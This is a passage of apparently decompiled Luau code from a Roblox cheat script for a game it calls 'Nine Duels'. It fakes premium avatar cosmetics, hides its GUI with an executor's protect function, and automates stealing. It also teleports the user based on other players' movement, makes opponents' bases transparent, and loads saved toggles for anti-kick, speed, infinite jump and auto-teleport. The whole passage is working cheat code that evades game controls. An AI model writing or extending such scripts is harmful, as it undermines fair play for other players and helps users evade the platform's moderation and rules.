						end
					end

					do
						local connection = nil

						local function fn35(arg, arg2)
							local v86 = arg and arg:FindFirstChild(arg2)

							if v86 then
								pcall(function()
									v86:Destroy()
								end)
							end
						end

						applyHeadlessAvatar = function(arg, arg2)
							local v86 = arg and arg:FindFirstChild("Head")
							if not v86 then
								return
							end

							if arg2 then
								pcall(function()
									v86.Transparency = 1
									v86.CanCollide = false
								end)

								local face = v86:FindFirstChild("face")

								if face and face:IsA("Decal") then
									pcall(function()
										face.Transparency = 1
									end)
								end

								fn35(v86, "NineDuelsHeadlessMesh")
								local specialMesh = Instance.new("SpecialMesh")
								specialMesh.Name = "NineDuelsHeadlessMesh"
								specialMesh.MeshType = Enum.MeshType.FileMesh
								specialMesh.MeshId = "rbxassetid://1095708"
								specialMesh.Scale = Vector3.new(0.001, 0.001, 0.001)
								specialMesh.Parent = v86
							else
								pcall(function()
									v86.Transparency = 0
									v86.CanCollide = true
								end)

								local face = v86:FindFirstChild("face")

								if face and face:IsA("Decal") then
									pcall(function()
										face.Transparency = 0
									end)
								end

								fn35(v86, "NineDuelsHeadlessMesh")
							end
						end

						applyKorbloxAvatar = function(parent, arg)
							local humanoid = parent and parent:FindFirstChildOfClass("Humanoid")
							if not humanoid then
								return
							end

							if humanoid.RigType == Enum.HumanoidRigType.R6 then
								local rightLeg = parent:FindFirstChild("Right Leg")
								if not rightLeg then
									return
								end

								if arg then
									fn35(rightLeg, "NineDuelsKorbloxMesh")

									pcall(function()
										rightLeg.Color = Color3.fromRGB(64, 64, 64)
									end)

									local specialMesh = Instance.new("SpecialMesh")
									specialMesh.Name = "NineDuelsKorbloxMesh"
									specialMesh.MeshType = Enum.MeshType.FileMesh
									specialMesh.MeshId = "rbxassetid://101851696"
									specialMesh.TextureId = "rbxassetid://101851254"
									specialMesh.Parent = rightLeg
								else
									fn35(rightLeg, "NineDuelsKorbloxMesh")

									pcall(function()
										rightLeg.Color = Color3.fromRGB(255, 255, 255)
									end)
								end
							else
								local rightUpperLeg = parent:FindFirstChild("RightUpperLeg")
								local rightLowerLeg = parent:FindFirstChild("RightLowerLeg")
								local rightFoot = parent:FindFirstChild("RightFoot")

								if arg then
									if rightUpperLeg then
										pcall(function()
											rightUpperLeg.Transparency = 1
										end)
									end

									if rightLowerLeg then
										pcall(function()
											rightLowerLeg.Transparency = 1
										end)
									end

									if rightFoot then
										pcall(function()
											rightFoot.Transparency = 1
										end)
									end

									fn35(parent, "NineDuelsKorbloxLeg")

									if rightUpperLeg then
										local part = Instance.new("Part")
										part.Name = "NineDuelsKorbloxLeg"
										part.Size = Vector3.new(1, 2, 1)
										part.Anchored = false
										part.CanCollide = false
										part.Massless = true
										part.Color = Color3.fromRGB(64, 64, 64)
										part.Parent = parent
										part.CFrame = rightUpperLeg.CFrame * CFrame.new(0, -0.8, 0)
										local specialMesh = Instance.new("SpecialMesh")
										specialMesh.Name = "NineDuelsKorbloxMesh"
										specialMesh.MeshType = Enum.MeshType.FileMesh
										specialMesh.MeshId = "rbxassetid://101851696"
										specialMesh.TextureId = "rbxassetid://101851254"
										specialMesh.Parent = part
										local weldConstraint = Instance.new("WeldConstraint")
										weldConstraint.Name = "NineDuelsKorbloxWeld"
										weldConstraint.Part0 = rightUpperLeg
										weldConstraint.Part1 = part
										weldConstraint.Parent = part
									end
								else
									if rightUpperLeg then
										pcall(function()
											rightUpperLeg.Transparency = 0
										end)
									end

									if rightLowerLeg then
										pcall(function()
											rightLowerLeg.Transparency = 0
										end)
									end

									if rightFoot then
										pcall(function()
											rightFoot.Transparency = 0
										end)
									end

									fn35(parent, "NineDuelsKorbloxLeg")
								end
							end

							return
						end

						applyAvatarVisuals = function(arg)
							if not arg then
								return
							end
							applyHeadlessAvatar(arg, headlessEnabled)
							applyKorbloxAvatar(arg, korbloxEnabled)
						end

						if connection then
							pcall(function()
								connection:Disconnect()
							end)
						end

						connection = LP.CharacterAdded:Connect(function(character)
							task.wait(0.2)
							applyAvatarVisuals(character)
						end)
					end
				end

				startUnwalk = function()
					local character = LP.Character
					if not character then
						return
					end
					local v86 = character:FindFirstChildOfClass("Humanoid")

					if v86 then
						for _, v87 in ipairs(v86:GetPlayingAnimationTracks()) do
							v87:Stop()
						end
					end

					local animate = character:FindFirstChild("Animate")

					if animate then
						unwalkSavedAnimate = animate:Clone()
						animate:Destroy()
					end
				end

				stopUnwalk = function()
					local character = LP.Character

					if character and unwalkSavedAnimate then
						unwalkSavedAnimate:Clone().Parent = character
						unwalkSavedAnimate = nil
					end
				end

				createStealBar = function()
					pcall(function()
						local CoreGui = game:GetService("CoreGui")
						local v86 = LP:FindFirstChild("PlayerGui")

						for _, v87 in ipairs({ "PhantomStealBar" }) do
							local v88 = CoreGui:FindFirstChild(v87)

							if v88 then
								v88:Destroy()
							end

							if v86 then
								local v89 = v86:FindFirstChild(v87)

								if v89 then
									v89:Destroy()
								end
							end
						end
					end)

					local screenGui = Instance.new("ScreenGui")
					screenGui.Name = "PhantomStealBar"
					screenGui.ResetOnSpawn = false
					screenGui.IgnoreGuiInset = true
					screenGui.DisplayOrder = 18

					pcall(function()
						if syn and syn.protect_gui then
							syn.protect_gui(screenGui)
						end
					end)

					if not pcall(function()
						screenGui.Parent = game:GetService("CoreGui")
					end) then
						screenGui.Parent = LP:WaitForChild("PlayerGui")
					end

					local frame = Instance.new("Frame", screenGui)
					frame.Name = "StealBar"
					frame.Size = UDim2.fromOffset(372, 42)
					frame.AnchorPoint = Vector2.new(0.5, 0.5)
					frame.Position = UDim2.new(0.5, 0, 1, -52)
					frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
					frame.BackgroundTransparency = 1
					frame.BorderSizePixel = 0
					frame.Active = true
					frame.ClipsDescendants = true
					Instance.new("UICorner", frame).CornerRadius = UDim.new(1, 0)
					local uiStroke = Instance.new("UIStroke", frame)
					uiStroke.Color = Color3.fromRGB(220, 220, 220)
					uiStroke.Thickness = 1.6
					uiStroke.Transparency = 0.05
					uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
					local uiGradient = Instance.new("UIGradient", uiStroke)
					local colorSequence = ColorSequence.new
					local tbl17 = {}
					local v86 = ColorSequenceKeypoint.new(0, Color3.fromRGB(55, 55, 55))
					local v87 = ColorSequenceKeypoint.new(0.42, Color3.fromRGB(190, 190, 190))
					local v88 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255))
					local v89 = ColorSequenceKeypoint.new(0.58, Color3.fromRGB(190, 190, 190))
					local new = ColorSequenceKeypoint.new
					local color = Color3.fromRGB
					tbl17[1] = v86
					tbl17[2] = v87
					tbl17[3] = v88
					tbl17[4] = v89

					do
						local values = table.pack(new(1, color(55, 55, 55)))
						table.move(values, 1, values.n, 5, tbl17)
					end

					uiGradient.Color = colorSequence(tbl17)

					task.spawn(function()
						while uiGradient and uiGradient.Parent do
							uiGradient.Rotation = (uiGradient.Rotation + 2) % 360
							task.wait(0.05)
						end
					end)

					local uiScale = Instance.new("UIScale", frame)
					uiScale.Name = "NineDuelsProgressBarScale"
					uiScale.Scale = stealBarScaleObj and stealBarScaleObj.Scale or _phantomModeIsMobile and 0.7 or 1
					stealBarScaleObj = uiScale
					local frame2 = Instance.new("Frame", frame)
					frame2.Size = UDim2.new(0, 214, 1, -10)
					frame2.Position = UDim2.new(0, 6, 0, 5)
					frame2.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
					frame2.BackgroundTransparency = 0.62
					frame2.BorderSizePixel = 0
					frame2.ClipsDescendants = true
					frame2.ZIndex = 3
					Instance.new("UICorner", frame2).CornerRadius = UDim.new(1, 0)
					local frame3 = Instance.new("Frame", frame2)
					frame3.Name = "Fill"
					frame3.Size = UDim2.new(0, 0, 1, 0)
					frame3.BackgroundColor3 = Color3.fromRGB(220, 220, 220)
					frame3.BackgroundTransparency = 0.08
					frame3.BorderSizePixel = 0
					frame3.ZIndex = 4
					Instance.new("UICorner", frame3).CornerRadius = UDim.new(1, 0)
					local instance = Instance.new("UIGradient", frame3)
					local colorSequence2 = ColorSequence.new
					local tbl18 = {}
					local v90 = ColorSequenceKeypoint.new(0, Color3.fromRGB(55, 55, 55))
					local v91 = ColorSequenceKeypoint.new(0.34, Color3.fromRGB(190, 190, 190))
					local v92 = ColorSequenceKeypoint.new(0.47, Color3.fromRGB(235, 235, 235))
					local v93 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255))
					local v94 = ColorSequenceKeypoint.new(0.53, Color3.fromRGB(235, 235, 235))
					local v95 = ColorSequenceKeypoint.new(0.66, Color3.fromRGB(190, 190, 190))
					tbl18[1] = v90
					tbl18[2] = v91
					tbl18[3] = v92
					tbl18[4] = v93
					tbl18[5] = v94
					tbl18[6] = v95

					do
						local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(55, 55, 55)))
						table.move(values, 1, values.n, 7, tbl18)
					end

					instance.Color = colorSequence2(tbl18)
					instance.Rotation = 0

					task.spawn(function()
						while instance and instance.Parent do
							instance.Offset = Vector2.new(-1, 0)
							local tween_ = TweenService:Create(
								instance,
								TweenInfo.new(1.15, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut),
								{ Offset = Vector2.new(1, 0) }
							)
							tween_:Play()
							tween_.Completed:Wait()
							task.wait(0.03)
						end
					end)

					local frame4 = Instance.new("Frame", frame2)
					frame4.Name = "AvatarBadge"
					frame4.Size = UDim2.fromOffset(28, 28)
					frame4.Position = UDim2.fromOffset(8, 2)
					frame4.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
					frame4.BackgroundTransparency = 0.08
					frame4.BorderSizePixel = 0
					frame4.ZIndex = 7
					Instance.new("UICorner", frame4).CornerRadius = UDim.new(1, 0)
					local imageLabel = Instance.new("ImageLabel", frame4)
					imageLabel.Name = "Avatar"
					imageLabel.Size = UDim2.fromOffset(18, 24)
					imageLabel.Position = UDim2.fromOffset(2, 2)
					imageLabel.BackgroundTransparency = 1
					imageLabel.BorderSizePixel = 0
					imageLabel.ScaleType = Enum.ScaleType.Crop
					imageLabel.ZIndex = 8
					Instance.new("UICorner", imageLabel).CornerRadius = UDim.new(1, 0)
					local instance2 = Instance.new("UIStroke", frame4)
					instance2.Color = Color3.fromRGB(230, 230, 230)
					instance2.Thickness = 1.5
					instance2.Transparency = 0.02
					instance2.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
					local uiGradient2 = Instance.new("UIGradient", instance2)
					local colorSequence3 = ColorSequence.new
					local tbl19 = {}
					local v96 = ColorSequenceKeypoint.new(0, Color3.fromRGB(55, 55, 55))
					local v97 = ColorSequenceKeypoint.new(0.42, Color3.fromRGB(190, 190, 190))
					local v98 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255))
					local v99 = ColorSequenceKeypoint.new(0.58, Color3.fromRGB(190, 190, 190))
					local new2 = ColorSequenceKeypoint.new
					local color2 = Color3.fromRGB
					local v100 = 55
					local v101 = 55
					tbl19[1] = v96
					tbl19[2] = v97
					tbl19[3] = v98
					tbl19[4] = v99

					do
						local values = table.pack(new2(1, color2(v100, v101, 55)))
						table.move(values, 1, values.n, 5, tbl19)
					end

					uiGradient2.Color = colorSequence3(tbl19)

					task.spawn(function()
						while uiGradient2 and uiGradient2.Parent do
							uiGradient2.Rotation = (uiGradient2.Rotation + 3) % 360
							task.wait(0.025)
						end
					end)

					task.spawn(function()
						local ok, image = pcall(function()
							return Players:GetUserThumbnailAsync(
								LP.UserId,
								Enum.ThumbnailType.HeadShot,
								Enum.ThumbnailSize.Size100x100
							)
						end)

						if ok and image and imageLabel and imageLabel.Parent then
							imageLabel.Image = image
						end
					end)

					local instance3 = Instance.new("TextLabel", frame2)
					instance3.Size = UDim2.new(0, 78, 1, 0)
					instance3.Position = UDim2.fromOffset(44, 0)
					instance3.BackgroundTransparency = 1
					instance3.Text = ""
					instance3.TextColor3 = Color3.fromRGB(255, 255, 255)
					instance3.Font = Enum.Font.GothamSemibold
					instance3.TextSize = 13
					instance3.TextXAlignment = Enum.TextXAlignment.Left
					instance3.ZIndex = 6
					local instance4 = Instance.new("TextLabel", frame2)
					instance4.Size = UDim2.new(0, 50, 1, 0)
					instance4.Position = UDim2.new(1, -55, 0, 0)
					instance4.BackgroundTransparency = 1
					instance4.Text = "0%"
					instance4.TextColor3 = Color3.fromRGB(230, 230, 230)
					instance4.Font = Enum.Font.GothamSemibold
					instance4.TextSize = 12
					instance4.TextXAlignment = Enum.TextXAlignment.Right
					instance4.ZIndex = 6
					local textLabel = Instance.new("TextLabel", frame)
					textLabel.Size = UDim2.new(0, 144, 0, 18)
					textLabel.Position = UDim2.fromOffset(222, 2)
					textLabel.BackgroundTransparency = 1
					textLabel.Text = "FPS 0  ·  0ms"
					textLabel.TextColor3 = Color3.fromRGB(230, 230, 230)
					textLabel.Font = Enum.Font.GothamSemibold
					textLabel.TextSize = 11
					textLabel.TextXAlignment = Enum.TextXAlignment.Center
					textLabel.ZIndex = 6
					local textLabel2 = Instance.new("TextLabel", frame)
					textLabel2.Name = "Clock"
					textLabel2.Size = UDim2.new(0, 144, 0, 16)
					textLabel2.Position = UDim2.fromOffset(222, 22)
					textLabel2.BackgroundTransparency = 1
					textLabel2.Text = "8:00 PM"
					textLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
					textLabel2.Font = Enum.Font.GothamSemibold
					textLabel2.TextSize = 10
					textLabel2.TextXAlignment = Enum.TextXAlignment.Center
					textLabel2.ZIndex = 50
					local frame5 = Instance.new("Frame", frame)
					frame5.Name = "WallpaperLayer"
					frame5.Size = UDim2.fromScale(1, 1)
					frame5.Position = UDim2.fromScale(0, 0)
					frame5.BackgroundTransparency = 1
					frame5.BorderSizePixel = 0
					frame5.ZIndex = 0
					frame5.ClipsDescendants = true
					Instance.new("UICorner", frame5).CornerRadius = UDim.new(1, 0)
					stealBarBgImageRef = Instance.new("ImageLabel", frame5)
					stealBarBgImageRef.Name = "Wallpaper"
					stealBarBgImageRef.Size = UDim2.fromScale(1, 1)
					stealBarBgImageRef.Position = UDim2.fromScale(0, 0)
					stealBarBgImageRef.BackgroundTransparency = 1
					stealBarBgImageRef.ImageTransparency = 0
					stealBarBgImageRef.ScaleType = Enum.ScaleType.Crop
					stealBarBgImageRef.ZIndex = 1
					stealBarBgImageRef.Visible = false
					Instance.new("UICorner", stealBarBgImageRef).CornerRadius = UDim.new(1, 0)
					stealBarBgOverlayRef = Instance.new("Frame", frame5)
					stealBarBgOverlayRef.Name = "WallpaperOverlay"
					stealBarBgOverlayRef.Size = UDim2.fromScale(1, 1)
					stealBarBgOverlayRef.Position = UDim2.fromScale(0, 0)
					stealBarBgOverlayRef.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
					stealBarBgOverlayRef.BackgroundTransparency = 0.68
					stealBarBgOverlayRef.BorderSizePixel = 0
					stealBarBgOverlayRef.ZIndex = 2
					stealBarBgOverlayRef.Visible = false
					Instance.new("UICorner", stealBarBgOverlayRef).CornerRadius = UDim.new(1, 0)
					stealBarFrame = frame
					local flag18 = false
					local position = nil
					local position2 = nil

					frame.InputBegan:Connect(function(input)
						if uiLocked then
							return
						end

						if
							input.UserInputType == Enum.UserInputType.MouseButton1
							or input.UserInputType == Enum.UserInputType.Touch
						then
							flag18 = true
							position = input.Position
							position2 = frame.Position

							input.Changed:Connect(function()
								if input.UserInputState == Enum.UserInputState.End then
									flag18 = false
								end
							end)
						end
					end)

					UIS.InputChanged:Connect(function(input)
						if
							flag18
							and (
								input.UserInputType == Enum.UserInputType.MouseMovement
								or input.UserInputType == Enum.UserInputType.Touch
							)
						then
							local n35 = input.Position - position
							frame.Position = UDim2.new(
								position2.X.Scale,
								position2.X.Offset + n35.X,
								position2.Y.Scale,
								position2.Y.Offset + n35.Y
							)
						end
					end)

					local str6 = "IDLE"
					local stealBar

					stealBar = {
						SetProgress = function(arg)
							local n35 = math.clamp(tonumber(arg) or 0, 0, 1)
							frame3.Size = UDim2.new(n35, 0, 1, 0)
							instance4.Text = math.floor(n35 * 100 + 0.5) .. "%"
						end,
						Reset = function()
							stealBar.SetProgress(0)
							str6 = "IDLE"
							instance3.Text = ""
						end,
						SetState = function(arg)
							str6 = arg
							instance3.Text = arg == "STEALING" and "" or arg
						end,
					}

					_G.StealBar = stealBar
					applyStealBarBgImage(stealBarBgIndex or 0)

					task.spawn(function()
						local now2 = tick()
						local tbl20 = {}
						local n35 = 60

						RunService.RenderStepped:Connect(function()
							local now3 = tick()
							local n36 = now3 - now2
							now2 = now3

							if n36 > 0 then
								table.insert(tbl20, 1 / n36)

								if #tbl20 > 30 then
									table.remove(tbl20, 1)
								end

								local n37 = 0

								for _, v102 in ipairs(tbl20) do
									n37 += v102
								end

								n35 = n37 / #tbl20
							end
						end)

						while frame and frame.Parent do
							local n36 = 0

							pcall(function()
								n36 =
									math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue())
							end)

							textLabel.Text = string.format("FPS %d  ·  %dms", math.floor(n35 + 0.5), n36)
							textLabel2.Text = os.date("%I:%M %p"):gsub("^0", "")
							task.wait(0.5)
						end
					end)

					task.spawn(function()
						while frame and frame.Parent do
							local autoStealEnabled = Steal.AutoStealEnabled and isStealing and stealStartTime
							local n35 = 0

							if autoStealEnabled then
								local v102 = stealStartTime
								n35 = math.clamp((tick() - v102) / getActiveStealDuration(), 0, 1)
							end

							stealBar.SetProgress(n35)
							task.wait(0.03)
						end
					end)
				end

				createStealBar()
				_G.NineDuelsMirrorTPDownEnabled = _G.NineDuelsMirrorTPDownEnabled == true

				do
					local tbl17 = {}
					local now2 = 0

					local function fn35()
						return autoBatEnabled == true or autoLeftEnabled == true or autoRightEnabled == true
					end

					local function fn36()
						local v86 = 0.3
						if tick() - now2 < v86 then
							return
						end
						now2 = tick()
						local character = LP.Character
						local v87 = character and character:FindFirstChild("HumanoidRootPart")
						character = character and character:FindFirstChildOfClass("Humanoid")
						if not v87 or not character or character.Health <= 0 then
							return
						end
						local v88, v89 = v87.CFrame:ToEulerAnglesYXZ()
						v87.CFrame = CFrame.new(v87.Position.X, -7, v87.Position.Z) * CFrame.Angles(0, v89, 0)
						v87.Velocity = Vector3.zero
						v87.AssemblyLinearVelocity = Vector3.zero
					end

					RunService.Heartbeat:Connect(function()
						if not _G.NineDuelsMirrorTPDownEnabled or not fn35() then
							table.clear(tbl17)
							return
						end

						for _, player_ in ipairs(Players:GetPlayers()) do
							if player_ ~= LP and player_.Character then
								local humanoidRootPart = player_.Character:FindFirstChild("HumanoidRootPart")

								if humanoidRootPart then
									local y = humanoidRootPart.Position.Y
									local v86 = tbl17[player_.UserId]

									if v86 and v86 - y >= 3 then
										fn36()
										table.clear(tbl17)
										return
									end

									tbl17[player_.UserId] = y
								end
							end
						end
					end)

					_G.NineDuelsSetMirrorTPDown = function(arg)
						_G.NineDuelsMirrorTPDownEnabled = arg == true

						if not arg then
							table.clear(tbl17)
						end
					end
				end
			end

			do
				_G.NineDuelsBaseXRayEnabled = _G.NineDuelsBaseXRayEnabled == true
				_G.NineDuelsBaseXRayTransparency = math.clamp(tonumber(_G.NineDuelsBaseXRayTransparency) or 0.5, 0, 1)
				_G.NineDuelsBrainrotXRayEnabled = false
				_G.NineDuelsBaseXRayState = _G.NineDuelsBaseXRayState or { saved = {}, conns = {}, run = 0 }
				_G.NineDuelsBrainrotXRayState = _G.NineDuelsBrainrotXRayState
					or { saved = {}, conns = {}, run = 0, names = nil }

				do
					local nineDuelsBaseXRayState = _G.NineDuelsBaseXRayState

					local tbl17 = {
						"Base",
						"PlotSign",
						"FriendPanel",
						"Cash",
						"Laser",
						"Decorations",
						"Skin",
						"Unlock",
						"Purchases",
					}

					local function fn35(arg, arg2, arg3)
						if not arg or arg3 ~= nineDuelsBaseXRayState.run then
							return
						end

						local function fn36(arg4)
							if arg4:IsA("BasePart") or arg4:IsA("Decal") or arg4:IsA("Texture") then
								if nineDuelsBaseXRayState.saved[arg4] == nil then
									nineDuelsBaseXRayState.saved[arg4] = arg4.Transparency
								end

								if nineDuelsBaseXRayState.saved[arg4] < 1 then
									arg4.Transparency = nineDuelsBaseXRayState.saved[arg4]
										+ (1 - nineDuelsBaseXRayState.saved[arg4]) * arg2
								end
							end
						end

						fn36(arg)

						for _, descendant in ipairs(arg:GetDescendants()) do
							fn36(descendant)
						end
					end

					local function fn36(arg, arg2)
						if not arg or arg2 ~= nineDuelsBaseXRayState.run then
							return
						end

						for _, v86 in ipairs(tbl17) do
							local v87 = arg:FindFirstChild(v86)

							if v87 then
								fn35(v87, math.clamp(tonumber(_G.NineDuelsBaseXRayTransparency) or 0.5, 0, 1), arg2)

								table.insert(
									nineDuelsBaseXRayState.conns,
									v87.DescendantAdded:Connect(function(descendant)
										fn35(
											descendant,
											math.clamp(tonumber(_G.NineDuelsBaseXRayTransparency) or 0.5, 0, 1),
											arg2
										)
									end)
								)
							end
						end

						table.insert(
							nineDuelsBaseXRayState.conns,
							arg.ChildAdded:Connect(function(child)
								if arg2 ~= nineDuelsBaseXRayState.run then
									return
								end

								if table.find(tbl17, child.Name) then
									fn35(child, 0.5, arg2)
								end
							end)
						)
					end

					_G.NineDuelsSetBaseXRay = function(arg)
						_G.NineDuelsBaseXRayEnabled = arg == true
						nineDuelsBaseXRayState.run = nineDuelsBaseXRayState.run + 1

						for _, conn in ipairs(nineDuelsBaseXRayState.conns) do
							pcall(function()
								conn:Disconnect()
							end)
						end

						nineDuelsBaseXRayState.conns = {}

						if not _G.NineDuelsBaseXRayEnabled then
							local saved = nineDuelsBaseXRayState.saved
							nineDuelsBaseXRayState.saved = {}

							for k, v86 in pairs(saved) do
								pcall(function()
									if k and k.Parent then
										k.Transparency = v86
									end
								end)
							end

							return
						end

						local run = nineDuelsBaseXRayState.run
						local v86 = workspace:FindFirstChild("Plots")
						if not v86 then
							return
						end

						for _, child in ipairs(v86:GetChildren()) do
							fn36(child, run)
						end

						table.insert(
							nineDuelsBaseXRayState.conns,
							v86.ChildAdded:Connect(function(child)
								task.wait(0.15)
								fn36(child, run)
							end)
						)
					end
				end
			end

			do
				local nineDuelsBrainrotXRayState = _G.NineDuelsBrainrotXRayState

				local function fn35()
					if nineDuelsBrainrotXRayState.names then
						return nineDuelsBrainrotXRayState.names
					end
					local names = {}

					pcall(function()
						local datas = ReplicatedStorage:FindFirstChild("Datas")
						local animals = datas and datas:FindFirstChild("Animals")

						if animals and animals:IsA("ModuleScript") then
							for k in pairs(require(animals)) do
								names[k] = true
							end
						end
					end)

					nineDuelsBrainrotXRayState.names = names
					return names
				end

				local function fn36(arg)
					local isModel = arg:IsA("Model")

					if isModel then
						local name = arg.Name
						isModel = fn35()[name] == true
					end

					return isModel
				end

				local function fn37(arg, arg2)
					if arg2 ~= nineDuelsBrainrotXRayState.run then
						return
					end

					local function fn38(arg3)
						if arg3:IsA("BasePart") or arg3:IsA("Decal") or arg3:IsA("Texture") then
							if nineDuelsBrainrotXRayState.saved[arg3] == nil then
								nineDuelsBrainrotXRayState.saved[arg3] = arg3.Transparency
							end

							if nineDuelsBrainrotXRayState.saved[arg3] < 0.5 then
								arg3.Transparency = 0.5
							end
						end
					end

					for _, descendant in ipairs(arg:GetDescendants()) do
						fn38(descendant)
					end
				end

				_G.NineDuelsSetBrainrotXRay = function(arg)
					_G.NineDuelsBrainrotXRayEnabled = arg == true
					nineDuelsBrainrotXRayState.run = nineDuelsBrainrotXRayState.run + 1

					for _, conn in ipairs(nineDuelsBrainrotXRayState.conns) do
						pcall(function()
							conn:Disconnect()
						end)
					end

					nineDuelsBrainrotXRayState.conns = {}

					if not _G.NineDuelsBrainrotXRayEnabled then
						local saved = nineDuelsBrainrotXRayState.saved
						nineDuelsBrainrotXRayState.saved = {}

						for k, v86 in pairs(saved) do
							pcall(function()
								if k and k.Parent then
									k.Transparency = v86
								end
							end)
						end

						return
					end

					local run = nineDuelsBrainrotXRayState.run
					fn35()

					task.spawn(function()
						local v86 = 0

						for _, descendant in ipairs(workspace:GetDescendants()) do
							if nineDuelsBrainrotXRayState.run ~= run then
								return
							end

							if fn36(descendant) then
								fn37(descendant, run)
							end

							v86 += 1

							if v86 % 500 == 0 then
								task.wait()
							end
						end
					end)

					table.insert(
						nineDuelsBrainrotXRayState.conns,
						workspace.DescendantAdded:Connect(function(descendant)
							if nineDuelsBrainrotXRayState.run ~= run then
								return
							end

							if descendant:IsA("Model") and fn36(descendant) then
								task.defer(function()
									if nineDuelsBrainrotXRayState.run == run and descendant.Parent then
										fn37(descendant, run)
									end
								end)
							end
						end)
					)
				end
			end
		end

		local fn35

		do
			do
				do
					pcall(function()
						if not (isfile and isfile("NineDuelsV1configLOL1/Config.json")) then
							return
						end

						local ok, result = pcall(function()
							return HS:JSONDecode(readfile("NineDuelsV1configLOL1/Config.json"))
						end)

						if ok then
							local v86 = "table"
							ok = type(result) == v86
						end

						if not ok then
							return
						end

						if type(result.normalSpeed) == "number" and result.normalSpeed > 0 then
							NS = result.normalSpeed
						end

						if type(result.antiVoidEnabled) == "boolean" then
							antiVoidEnabled = result.antiVoidEnabled
						end

						if tonumber(result.instantResetVersion) == 2 then
							instantResetVersion = 2
						else
							instantResetVersion = 1
						end

						if type(result.carrySpeed) == "number" and result.carrySpeed > 0 then
							CS = result.carrySpeed
						end

						if type(result.laggerSpeed) == "number" and result.laggerSpeed > 0 then
							LAGGER_SPEED = result.laggerSpeed
						end

						if type(result.laggerCarrySpeed) == "number" and result.laggerCarrySpeed > 0 then
							LAGGER_CARRY_SPEED = result.laggerCarrySpeed
						end

						if type(result.carrySpeedActive) == "boolean" then
							carrySpeedActive = result.carrySpeedActive
						end

						if type(result.laggerModeEnabled) == "boolean" then
							laggerModeEnabled = result.laggerModeEnabled
						end

						if type(result.laggerCarryToggled) == "boolean" then
							laggerCarryToggled = result.laggerCarryToggled
						end

						if type(result.autoLeftEnabled) == "boolean" then
							autoLeftEnabled = result.autoLeftEnabled
						end

						if type(result.autoRightEnabled) == "boolean" then
							autoRightEnabled = result.autoRightEnabled
						end

						if type(result.autoBat) == "boolean" then
							autoBatEnabled = result.autoBat
						end

						if type(result.batV2Toggled) == "boolean" then
							_savedBatV2Toggled = result.batV2Toggled
						end

						if type(result.batTpVersion) == "number" then
							local v86 = 1
							local v87 = 2
							n32 = math.clamp(math.floor(result.batTpVersion), v86, v87)
						end

						if result.dropBrainrotMode == "Stand Still" or result.dropBrainrotMode == "Walk" then
							selectedDropMode = result.dropBrainrotMode
						elseif result.dropBrainrotMode == "Jump" or result.dropBrainrotMode == "Normal" then
							selectedDropMode = "Walk"
						end

						if type(result.baseXRayEnabled) == "boolean" then
							_G.NineDuelsBaseXRayEnabled = result.baseXRayEnabled
						end

						if type(result.baseXRayTransparency) == "number" then
							_G.NineDuelsBaseXRayTransparency = math.clamp(result.baseXRayTransparency, 0, 1)
						end

						_G.NineDuelsBrainrotXRayEnabled = false

						if type(result.mirrorTPDownEnabled) == "boolean" then
							_G.NineDuelsMirrorTPDownEnabled = result.mirrorTPDownEnabled
						end

						if type(result.antiRagdollEnabled) == "boolean" then
							antiRagdollEnabled = result.antiRagdollEnabled
						elseif type(result.antiRagdoll) == "boolean" then
							antiRagdollEnabled = result.antiRagdoll
						else
							antiRagdollEnabled = true
						end

						if type(result.infiniteJump) == "boolean" then
							infJumpEnabled = result.infiniteJump
						end

						if type(result.infJumpMode) == "string" then
							infJumpMode = string.lower(result.infJumpMode) == "hold" and "hold" or "classic"
						end

						if type(result.autoStealEnabled) == "boolean" then
							Steal.AutoStealEnabled = result.autoStealEnabled
						end

						if type(result.grabRadius) == "number" then
							Steal.StealRadius = result.grabRadius
						end

						if type(result.stealDuration) == "number" then
							Steal.StealDuration = result.stealDuration
						end

						if result.selectedStealMode == "Semi" then
							selectedStealMode = "Semi"
						else
							selectedStealMode = "Normal"
						end

						selectedSemiMode = result.selectedSemiMode == "V2" and "V2"
							or result.selectedSemiMode == "V3" and "V3"
							or "V1"

						if type(result.stealRadii) == "table" then
							AceStealRadii.Normal = tonumber(result.stealRadii.Normal) or AceStealRadii.Normal
							AceStealRadii.Semi = tonumber(result.stealRadii.Semi) or AceStealRadii.Semi
							AceStealRadii.SemiV2Radius = tonumber(result.stealRadii.SemiV2Radius)
								or AceStealRadii.SemiV2Radius
							AceStealRadii.SemiV2SemiRadius = tonumber(result.stealRadii.SemiV2SemiRadius)
								or AceStealRadii.SemiV2SemiRadius
						end

						Steal.StealRange = tonumber(result.stealRange) or Steal.StealRange or 10
						Steal.EntryDelay = tonumber(result.entryDelay) or Steal.EntryDelay or 0.3
						Steal.HoldMax = tonumber(result.holdMax) or Steal.HoldMax or 2.6
						Steal.StealRadius = AceStealRadii[selectedStealMode] or Steal.StealRadius

						if type(result.autoSwing) == "boolean" then
							autoSwingEnabled = result.autoSwing
						end

						if type(result.batCounterEnabled) == "boolean" then
							batCounterEnabled = result.batCounterEnabled
						end

						if type(result.medusaCounterEnabled) == "boolean" then
							medusaCounterEnabled = result.medusaCounterEnabled
						end

						if type(result.unwalkEnabled) == "boolean" then
							unwalkEnabled = result.unwalkEnabled
						end

						if type(result.antiLag) == "boolean" then
							antiLagEnabled = result.antiLag
						end

						antiDieEnabled = true

						if type(result.antiKick) == "boolean" then
							antiKickEnabled = result.antiKick
						end

						if type(result.safeMode) == "boolean" then
							safeModeEnabled = result.safeMode
						end

						if type(result.headless) == "boolean" then
							headlessEnabled = result.headless
						end

						if type(result.korblox) == "boolean" then
							korbloxEnabled = result.korblox
						end

						if type(result.stretchRez) == "boolean" then
							stretchRezEnabled = result.stretchRez
						end

						if type(result.autoTPEnabled) == "boolean" then
							autoTPEnabled = result.autoTPEnabled
						end

						if type(result.autoTPHeight) == "number" then
